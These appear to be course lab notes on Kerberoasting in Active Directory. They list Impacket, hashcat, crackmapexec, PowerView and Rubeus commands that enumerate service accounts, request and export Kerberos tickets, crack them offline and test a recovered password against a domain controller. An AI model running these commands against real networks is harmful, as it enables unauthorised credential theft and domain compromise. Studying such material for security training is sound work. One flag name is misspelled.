# Cooking With Fire (kerberoasting)

## Kerberoasting - From Linux

A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.



This attacks targets `Service Principal Names (SPN)` accounts.

SPN are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running.

Any domain user can request a Kerberos ticket for any service account in the same domain.



**Depending on your position in a network, this attack can be performed in multiple ways:**

* From a non-domain joined Linux host using valid domain user credentials.
* From a domain-joined Linux host as root after retrieving the keytab file.
* From a domain-joined Windows host authenticated as a domain user.
* From a domain-joined Windows host with a shell in the context of a domain account.
* As SYSTEM on a domain-joined Windows host.
* From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.





* `Impacket-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend` → list spn accounts
* `Impacket-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request` → Requesting all TGS tickets
* `Impacket-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev` → Requesting a single TGS ticket.



we can use `-outputfil filename` flag to save the TGS ticket in a file.

* `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt` → cracking Ticket offline using Hashcat
* `sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!` → testing authentication against a domain controller



## Kerberoasting - From Windows

`C:\htb> setspn.exe -Q /` → lists various available SPNs

### **Using PowerView**

* `PS C:\\htb> Import-Module .\\PowerView.ps1` → importing powerview
* `PS C:\\htb> Get-DomainUser * -spn | select samaccountname` → getting spn account
* `PS C:\\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat` → Targeting Specific User
* `PS C:\\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation` → Exporting All tickets to csv file

### **Using Rubeus**

Rubeus doesnot need us to explicitly set the SPN or the user.

* `PS C:\\htb> .\\Rubeus.exe kerberoast /stats` → get the stats
*   `PS C:\\htb> .\\Rubeus.exe kerberoast`

    we can add flag `/nowrap` so that hash will not be wrapped in any form so it will be easier to crack using hashcat.

    also we can use `/outfile:filename` to save the ticket, instead of displaying it.
* `PS C:\\htb> .\\Rubeus.exe kerberoast /user:testspn /nowrap` → for specific user.

we can use `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket.

RC4 is easier to crack compared to AES 256 and128



